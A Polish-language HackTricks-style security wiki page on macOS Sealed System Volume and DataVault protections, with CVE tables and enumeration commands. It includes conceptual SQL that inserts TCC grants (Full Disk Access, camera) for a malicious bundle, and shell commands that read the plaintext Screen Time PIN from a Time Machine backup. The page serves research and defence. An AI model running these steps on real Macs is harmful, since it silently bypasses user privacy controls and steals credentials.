# macOS Sealed System Volume i DataVault

{{#include ../../../banners/hacktricks-training.md}}

## Sealed System Volume (SSV)

### Informacje podstawowe

Począwszy od **macOS Big Sur (11.0)**, wolumin systemowy jest kryptograficznie zabezpieczany za pomocą **drzewa hashy migawki APFS**. Nazywa się to **Sealed System Volume (SSV)**. Partycja systemowa jest montowana **tylko do odczytu**, a każda modyfikacja narusza pieczęć, która jest weryfikowana podczas rozruchu.<sup>[[11]](#references)</sup>

SSV zapewnia:
- **Wykrywanie manipulacji** — każda modyfikacja plików binarnych lub frameworków systemowych zmienia korzeń drzewa Merkle’a i unieważnia pieczęć podpisaną przez Apple
- **Uwierzytelnianie podczas rozruchu** — łańcuch rozruchowy weryfikuje wybraną migawkę systemu, zanim stanie się ona głównym systemem plików
- **Odporność na rootkity** — nawet root nie może trwale zastąpić plików w uwierzytelnionej migawce systemu bez wyłączenia authenticated root lub naruszenia autoryzowanej ścieżki aktualizacji

SSV chroni wolumin **System**, a nie sparowany z nim zapisywalny wolumin **Data**. Firmlinki łączą oba woluminy w przestrzeni nazw widocznej pod `/`, więc ścieżka wyglądająca na zapisywalną nie dowodzi, że znajdujący się pod nią obiekt należy do zabezpieczonej migawki. FileVault i Data Protection zapewniają poufność danych przechowywanych w spoczynku; są niezależne od integralności SSV.<sup>[[11]](#references)</sup>

### Sprawdzanie stanu SSV

```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / " 

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```

### Efektywny widok systemu: SSV + grafty Cryptex

W nowszych wersjach macOS nie każdy plik wykonywalny widoczny w `/System` musi pochodzić z uruchomionej migawki SSV. **Cryptexes** to osobno uwierzytelnione obrazy dysków APFS, których zawartość jest nakładana na wybrane katalogi; dlatego Rapid Security Responses mogą zastępować komponenty istotne z punktu widzenia bezpieczeństwa bez przebudowy bazowego SSV. Podczas analizy persistence lub porównywania kodu systemowego sprawdź aktywne punkty montowania oraz magazyn Preboot Cryptex zamiast haszować wyłącznie bazową migawkę:

```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```

Rozruch łańcucha i szczegóły Rapid Security Response omówiono w [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses); ta sekcja skupia się na samej granicy SSV.

### Uprawnienia SSV Writer

Niektóre systemowe pliki binarne Apple mają uprawnienia umożliwiające modyfikowanie zapieczętowanego woluminu systemowego lub zarządzanie nim:

| Uprawnienie | Cel |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | Przywrócenie woluminu systemowego do poprzedniej migawki |
| `com.apple.private.apfs.create-sealed-snapshot` | Utworzenie nowej zapieczętowanej migawki po aktualizacjach systemu |
| `com.apple.rootless.install.heritable` | Zapis do ścieżek chronionych przez SIP (dziedziczone przez procesy potomne) |
| `com.apple.rootless.install` | Zapis do ścieżek chronionych przez SIP |

### Wyszukiwanie SSV Writers

```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```

### Scenariusze ataków

#### Snapshot Rollback Attack

Jeśli atakujący przejmie kontrolę nad plikiem binarnym z uprawnieniem `com.apple.private.apfs.revert-to-snapshot`, może **przywrócić wolumin systemowy do stanu sprzed aktualizacji**, odzyskując znane podatności:

```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```

> [!WARNING]
> Przywrócenie snapshotu skutecznie **cofa aktualizacje zabezpieczeń**, przywracając wcześniej załatane luki w kernelu i systemie. To jedna z najbardziej niebezpiecznych operacji, jakie można wykonać we współczesnym macOS.

#### Podmiana binariów systemowych

Po obejściu SIP i uzyskaniu możliwości zapisu do SSV atakujący może:

1. Zamontować wolumin systemowy z prawami do odczytu i zapisu
2. Zastąpić demona systemowego lub bibliotekę frameworka wersją zawierającą trojana
3. Ponownie podpisać snapshot (lub zaakceptować naruszenie podpisu, jeśli SIP jest już osłabione)
4. Rootkit utrzymuje się po ponownym uruchomieniu i pozostaje niewidoczny dla narzędzi wykrywających działających w userlandzie

### CVE z rzeczywistych ataków

| CVE | Opis |
|---|---|
| CVE-2021-30892 | **Shrootless** — obejście SIP wykorzystujące entitlement `com.apple.rootless.install.heritable` procesu `system_installd` do uruchamiania dowolnych skryptów post-install ([Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/))<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | Obejście SIP: `system_installd` umieszczał skrypt post-install w folderze chronionym przez SIP pod `/tmp`, ale samo `/tmp` nie jest chronione przez SIP, więc folder można było podmienić, montując na nim obraz ([Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html))<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** — wyścig copy-on-write w XNU umożliwiający zapis do plików należących do roota i tylko do odczytu ([Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/))<sup>[[3]](#references)</sup> |

---

## DataVault

### Informacje podstawowe

**DataVault** to ochrona systemu plików oparta na entitlement, stosowana do poufnych plików i katalogów. Flaga BSD `UF_DATAVAULT` (`0x00000080`) oznacza obiekt wymagający entitlement do odczytu i zapisu; w przeciwieństwie do zwykłego DAC samo uzyskanie uprawnień **root** lub Pełnego dostępu do dysku nie spełnia tego warunku, gdy ochrona jest aktywna.<sup>[[4]](#references)[[13]](#references)</sup>

Nie używaj określenia „DataVault” jako synonimu każdej chronionej bazy danych. Bazy TCC podlegają zasadom TCC/FDA i SIP (zob. [macOS TCC](macos-tcc/README.md)), natomiast dostęp do elementów pęku kluczy zależy również od ACL pęku kluczy i ochrony kryptograficznej (zob. [macOS Keychain](../../macos-red-teaming/macos-keychain.md)). Rzeczywiste przykłady DataVault często występują jako magazyny należące do usług w ścieżkach `/private/var/folders/.../0/`, na przykład magazyn Czasu przed ekranem; flaga jest widoczna jako `datavault` w flagach plików BSD, jeśli można wykonać `stat` na katalogu nadrzędnym.

### Entitlements kontrolerów DataVault

| Entitlement | Zakres |
|---|---|
| `com.apple.rootless.datavault.controller` | Dostęp do obiektów `UF_DATAVAULT` i zarządzanie nimi<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | Zarządzanie decyzjami TCC; to powiązana, ale odrębna granica prywatności |
| `com.apple.private.tcc.allow` | Omijanie wybranych usług TCC wymienionych w wartości entitlement |
| `com.apple.rootless.storage.TCC` | Zapis do chronionego przez SIP magazynu TCC |

Proces łączący entitlement kontrolera DataVault z FDA, funkcjami tworzenia kopii zapasowych lub indeksowania albo obsługą IPC jest szczególnie interesujący: szukaj prymitywu confused deputy, który kopiuje chroniony obiekt do zwykłej ścieżki, zamiast próbować otworzyć bezpośrednio skarbiec.<sup>[[14]](#references)</sup>

### Wyszukiwanie kontrolerów DataVault

```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```

### Scenariusze ataków

#### Bezpośrednia modyfikacja bazy danych TCC (odrębna granica TCC)

Jeśli atakujący przejmie kontrolę nad procesem menedżera TCC (np. przez wstrzyknięcie kodu do procesu z uprawnieniem `com.apple.private.tcc.manager`), może **bezpośrednio zmodyfikować bazę danych TCC**, aby przyznać dowolnej aplikacji dowolne uprawnienie TCC:<sup>[[12]](#references)</sup>

```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```

> [!CAUTION]
> Modyfikacja bazy danych TCC to **najskuteczniejszy sposób obejścia ochrony prywatności** — umożliwia po cichu nadanie dowolnych uprawnień, bez monitu dla użytkownika ani widocznego wskaźnika. Historycznie wiele łańcuchów eskalacji uprawnień w macOS kończyło się zapisem w bazie danych TCC jako końcowym payloadem.

#### Dostęp do bazy danych Keychain

Bezpośredni dostęp do bazy danych, która przechowuje dane keychain, nie jest równoznaczny z dostępem do sekretów w postaci jawnej. Jeśli inna granica uprawnień pozwala atakującemu skopiować bazę danych, nadal trzeba zaatakować materiał kluczy i ACL elementów; zamiast zakładać, że uprawnienie DataVault-controller wystarczy, zobacz dedykowaną stronę [macOS Keychain](../../macos-red-teaming/macos-keychain.md).

#### Granica kopii zapasowej: Time Machine

Analiza z 2026 roku pokazała przydatny, ogólny schemat: `backupd` ma zarówno uprawnienie `com.apple.rootless.datavault.controller`, jak i Full Disk Access, dzięki czemu może kopiować chronione magazyny danych. W testowanej konfiguracji katalog `/private/var/folders` był uwzględniony w Time Machine, a zamontowana kopia zapasowa nie egzekwowała granicy DataVault obowiązującej w działającym systemie. Badacz wykorzystał to, aby zlokalizować bazę SQLite funkcji Screen Time i odczytać zapisany w postaci jawnej PIN ograniczeń bez otwierania aktywnego sejfu. Potraktuj to jako **atak na granicę kopii**: wyszukuj pośredników obsługujących kopie zapasowe, eksport, migrację, indeksowanie i diagnostykę, którzy mogą umieszczać dane z sejfu w słabiej chronionym zamontowanym systemie plików lub pod słabiej chronioną ścieżką.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```

To zachowanie zależy od wersji i układu kopii zapasowej. Zweryfikuj je na docelowej kompilacji i pamiętaj, że zaszyfrowany nośnik Time Machine chroni kopię tylko wtedy, gdy jest zablokowany; po zamontowaniu jego mechanizmy kontroli dostępu stają się częścią powierzchni ataku.

### Rzeczywiste CVE związane z DataVault/TCC Bypass

| CVE | Opis |
|---|---|
| CVE-2024-44131 | Wyścig symlinków w FileProvider umożliwiający uprzywilejowanemu helperowi dostęp do danych chronionych przez TCC ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | Jako root **utwórz nowego użytkownika, którego `NFSHomeDirectory` wskazuje na kontrolowany przez atakującego plik `TCC.db`**; po zalogowaniu `tccd` używa tego pliku, a uprawnienia zostają zastosowane, umożliwiając dostęp do danych innych użytkowników ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | „powerdir”: zmiana katalogu domowego użytkownika w celu podłożenia kontrolowanego przez atakującego pliku TCC.db ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | Błąd w weryfikacji bundle’a umożliwiający aplikacji **odziedziczenie uprawnień TCC przyznanych bundle’owi-dawcy** bez wyświetlenia monitu; luka była wykorzystywana na wolności przez **XCSSET** do wykonywania zrzutów ekranu pulpitu ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | `tccd` budował ścieżkę do bazy danych na podstawie `$HOME`, więc `launchctl setenv HOME` przekierowywało go do kontrolowanego przez atakującego pliku `TCC.db` ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | `coreaudiod` miał uprawnienie `com.apple.private.tcc.manager` **i** wyłączoną walidację bibliotek, więc wtyczka HAL umieszczona w `/Library/Audio/Plug-Ins/HAL` mogła przyznać dowolne uprawnienia TCC ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [Microsoft wykrywa nową lukę w macOS — Shrootless — która może ominąć System Integrity Protection](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Analiza techniczna: CVE-2022-22583 - Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow - Warto robić źle](https://worthdoingbadly.com/macdirtycow/)
- [4] [Bezpieczeństwo platform Apple — ochrona danych](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass wykrada dane z iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji - Odkrywanie złośliwego oprogramowania macOS: omijanie TCC](https://blog.kandji.io/malware-bypass-tcc)
- [7] [Nowa luka w macOS, „powerdir”, może prowadzić do nieautoryzowanego dostępu do danych użytkownika](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [W złośliwym oprogramowaniu XCSSET wykryto lukę zero-day umożliwiającą TCC bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934: omijanie frameworka Transparency, Consent, and Control (TCC) w macOS](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [Odtwarzanie muzyki i omijanie TCC, czyli CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [Koszmar aktualizacji OTA Apple (migawki APFS)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — wykorzystywanie TCC](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [Jak ominąć własny kod Czasu przed ekranem — analiza źródła oraz Time Machine/DataVault](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
